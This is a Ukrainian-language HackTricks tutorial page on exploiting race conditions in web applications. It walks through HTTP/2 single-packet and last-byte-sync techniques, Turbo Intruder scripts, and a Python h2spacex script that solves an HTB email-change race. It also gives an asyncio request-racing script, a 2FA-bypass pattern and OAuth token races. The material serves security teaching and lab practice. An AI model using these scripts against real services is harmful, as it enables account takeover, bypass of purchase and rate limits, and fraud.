# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Для глибокого розуміння цієї техніки ознайомтеся з оригінальним звітом у [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Покращення атак Race Condition

Головна перешкода для використання race conditions — забезпечити обробку кількох запитів одночасно, з дуже малою різницею в часі обробки — ідеально менше ніж 1ms.

Тут наведено деякі методи синхронізації запитів:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Підтримує надсилання двох запитів по одному TCP-з’єднанню, що зменшує вплив мережевого jitter. Однак через варіації на серверній стороні двох запитів може бути недостатньо для стабільного експлойту race condition.
- **HTTP/1.1 'Last-Byte Sync'**: Дозволяє попередньо відправити більшу частину 20–30 запитів, утримуючи невеликий фрагмент, який потім надсилається разом, досягаючи одночасного прибуття на сервер.

Підготовка до Last-Byte Sync включає:

1. Надіслати headers і body data за винятком останнього байта, не закриваючи stream.
2. Почекати ~100ms після початкової відправки.
3. Вимкнути TCP_NODELAY, щоб використати Nagle's algorithm для батьчингу фінальних фреймів.
4. Виконати ping для "прогрівання" з'єднання.

Подальша відправка утримуваних фреймів має призвести до їхнього прибуття в одному пакеті, що можна перевірити через Wireshark. Цей метод не застосовується до статичних файлів, які зазвичай не залучені в RC-атаках.

### Адаптація до архітектури сервера

Розуміння архітектури цілі є критично важливим. Front-end servers можуть маршрутизувати запити по-різному, що впливає на таймінги. Попереднє прогрівання з'єднань на серверній стороні за допомогою неістотних запитів може нормалізувати час обробки запитів.

#### Робота з блокуванням на основі сесій

Фреймворки, як-от PHP's session handler, серіалізують запити за сесією, що може приховувати вразливості. Використання різних session tokens для кожного запиту може обійти цю проблему.

#### Подолання обмежень швидкості або ресурсів

Якщо прогрівання з’єднання не ефективне, штучне викликання затримок через ліміти швидкості або ресурсів веб-сервера (флуд допоміжних запитів) може сприяти single-packet attack, індукуючи серверну затримку, сприятливу для race conditions.

## Приклади атак

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Ви можете надіслати запит у **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), у запиті змінити значення, яке хочете перебрати для **`%s`**, наприклад `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`, а потім вибрати **`examples/race-single-packer-attack.py`** у випадаючому списку:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Якщо ви збираєтеся відправляти різні значення, ви можете модифікувати код цим прикладом, який використовує wordlist із буфера обміну:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Якщо веб не підтримує HTTP2 (тільки HTTP1.1), використовуйте `Engine.THREADED` або `Engine.BURP` замість `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: У випадку, якщо потрібно відправити request до 1 endpoint, а потім кілька до інших endpoint-ів, щоб викликати RCE, ви можете змінити скрипт `race-single-packet-attack.py` на щось на кшталт:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Це також доступно в **Repeater** через нову опцію '**Send group in parallel**' у Burp Suite.
- Для **limit-overrun** ви можете просто додати **той самий запит 50 разів** до групи.
- Для **connection warming** ви можете **додати** на **початку** **групи** кілька **запитів** до якоїсь нестатичної частини веб-сервера.
- Для **delaying** процесу **між** обробкою **одного запиту та іншого** у 2 substates steps, ви можете **додати додаткові запити між** обома запитами.
- Для **multi-endpoint** RC ви можете почати надсилати **запит**, що **переходить у прихований стан**, а потім відправити **50 запитів** одразу після нього, які **експлуатують прихований стан**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Мета цього скрипта — змінити email користувача, постійно перевіряючи його, поки токен підтвердження нового email не надійде на останню електронну адресу (це тому, що в коді спостерігалася RC, в якій було можливо змінити email, але верифікація відправлялася на стару адресу, бо змінна, що вказує email, вже була заповнена першою).\
Коли в отриманих листах знайдено слово "objetivo", ми знаємо, що отримали токен підтвердження зміненого email і припиняємо атаку.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Покращення Single Packet Attack

У первісному дослідженні пояснюється, що ця атака має ліміт 1,500 байт. Однак у [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) показано, як можна розширити обмеження в 1,500 байт single packet attack до **65,535 B window limitation of TCP by using IP layer fragmentation** (розбиттям одного пакета на кілька IP-пакетів) і відправляти їх у різному порядку, що перешкоджає збиранню пакета, поки всі фрагменти не дійдуть до сервера. Ця техніка дозволила досліднику надіслати 10,000 запитів приблизно за 166ms.

Зауважте, що хоча це покращення робить атаку більш надійною в RC, яка вимагає сотень/тисяч пакетів, що прибувають одночасно, воно також може стикатися з програмними обмеженнями. Деякі популярні HTTP-сервери, як Apache, Nginx і Go, мають суворе налаштування `SETTINGS_MAX_CONCURRENT_STREAMS` значенням 100, 128 і 250 відповідно. Однак інші, як NodeJS і nghttp2, мають це без обмежень.\
Це фактично означає, що Apache розглядатиме лише 100 HTTP-з’єднань з однієї TCP-з’єднання (обмежуючи цю RC-атаку).

Деякі приклади використання цієї техніки можна знайти в репозиторії [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

До попереднього дослідження використовувалися payloadи, які просто намагалися відправляти пакети якнайшвидше, щоб спричинити RC.

- **Repeater:** Перевірте приклади з попереднього розділу.
- **Intruder**: Надішліть **request** до **Intruder**, встановіть **number of threads** на **30** у меню **Options**, виберіть як payload **Null payloads** і згенеруйте **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Методологія RC**

### Перевищення ліміту / TOCTOU

Це найпростіший тип race condition, коли вразливості **з’являються** у місцях, що **обмежують кількість разів, коли ви можете виконати дію**. Наприклад, використання одного й того ж знижкового коду у веб-магазині кілька разів. Дуже простий приклад можна знайти в [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) або в [**this bug**](https://hackerone.com/reports/759247)**.**

Існує багато варіацій такого типу атаки, зокрема:

- Використання подарункової карти кілька разів
- Оцінювання продукту кілька разів
- Зняття або переказ коштів понад баланс рахунку
- Повторне використання одного й того ж CAPTCHA рішення
- Обхід anti-brute-force rate limit

### **Приховані підстани**

Експлуатація складних race conditions часто включає використання коротких вікон можливостей для взаємодії з прихованими або **непередбаченими підстанами машини**. Ось як підходити до цього:

1. **Виявити потенційні приховані підстани**
- Почніть з визначення endpoints, які змінюють або взаємодіють з критичними даними, такими як профілі користувачів або процеси скидання пароля. Зосередьтесь на:
- **Storage**: Віддавайте перевагу endpoints, які маніпулюють стійкими даними на боці сервера над тими, що обробляють дані на клієнті.
- **Action**: Шукайте операції, що змінюють існуючі дані — вони більш імовірно створюють експлойтабельні умови порівняно з операціями, що додають нові дані.
- **Keying**: Успішні атаки зазвичай залежать від операцій, що використовують той самий ідентифікатор, напр., username або reset token.
2. **Провести початкове зондування**
- Перевіряйте виявлені endpoints за допомогою race condition атак, спостерігаючи за будь-якими відхиленнями від очікуваних результатів. Неочікувані відповіді або зміни в поведінці застосунку можуть свідчити про вразливість.
3. **Демонструвати вразливість**
- Зведіть атаку до мінімальної кількості запитів, необхідних для її експлуатації, часто це лише два запити. Цей крок може вимагати багато спроб або автоматизації через точність часу.

### Атаки, чутливі до часу

Точність у таймінгу запитів може виявити вразливості, особливо коли для security tokens використовують передбачувані методи, такі як timestamps. Наприклад, генерація password reset tokens на основі timestamps може дозволити ідентичні токени для одночасних запитів.

**Щоб експлуатувати:**

- Використовуйте точний таймінг, наприклад single packet attack, щоб зробити одночасні password reset requests. Ідентичні tokens вказують на вразливість.

**Приклад:**

- Запитайте два password reset tokens одночасно та порівняйте їх. Якщо tokens співпадають — це свідчить про помилку в генерації токенів.

**Спробуйте це в** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **.**

## Кейси прихованих підстан

### Pay & add an Item

Перегляньте [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation), щоб побачити, як **оплатити** у магазині та **додати додатковий** товар, за який **не доведеться платити**.

### Confirm other emails

Ідея в тому, щоб **перевірити email-адресу та одночасно змінити її на іншу**, щоб з’ясувати, чи платформа підтверджує нову адресу.

### Change email to 2 emails addresses Cookie based

Згідно з [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab був уразливий до takeover таким чином, бо він міг **надіслати** **email verification token** однієї адреси на іншу адресу.

**Спробуйте це в** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **.**

### Hidden Database states / Confirmation Bypass

Якщо для додавання інформації в базу даних використовуються 2 різні операції запису, існує короткий проміжок часу, коли записано лише перші дані. Наприклад, при створенні користувача username і password можуть бути записані, а потім записується token для підтвердження нового акаунта. Це означає, що протягом короткого часу token для підтвердження акаунта може бути null.

Тому реєстрація акаунта та відправка кількох запитів з порожнім token (`token=` або `token[]=` або будь-яка інша варіація) для миттєвого підтвердження акаунта може дозволити **підтвердити акаунт**, де ви не контролюєте email.

**Спробуйте це в** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **.**

### Обхід 2FA

Наступний псевдокод вразливий до race condition, бо протягом дуже короткого часу **2FA не застосовується**, поки створюється session:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 вічна персистентність

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Theses services will allow you to create an application and authenticate users that the provider has registered. In order to do so, the **client** will need to **permit your application** to access some of their data inside of the **OAUth provider**.\
So, until here just a common login with google/linkedin/github... where you are prompted with a page saying: "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

Проблема виникає, коли ви **погоджуєтесь** і автоматично надсилається **`authorization_code`** до зловмисного додатка. Далі цей додаток зловживає Race Condition у OAUth-провайдера, щоб згенерувати більше ніж один AT/RT (Authentication Token/Refresh Token) з `authorization_code` для вашого акаунта. По суті, він використовує те, що ви дозволили додатку доступ до ваших даних, щоб **створити кілька акаунтів**. Якщо ви припините дозволяти додатку доступ до своїх даних, одна пара AT/RT буде видалена, але інші все одно залишаться дійсними.

#### Race Condition in `Refresh Token`

Once you have **obtained a valid RT** you could try to **abuse it to generate several AT/RT** and **even if the user cancels the permissions** for the malicious application to access his data, **several RTs will still be valid.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallel** to abuse **Race Conditions also in Web Sockets**.
- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()` (thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
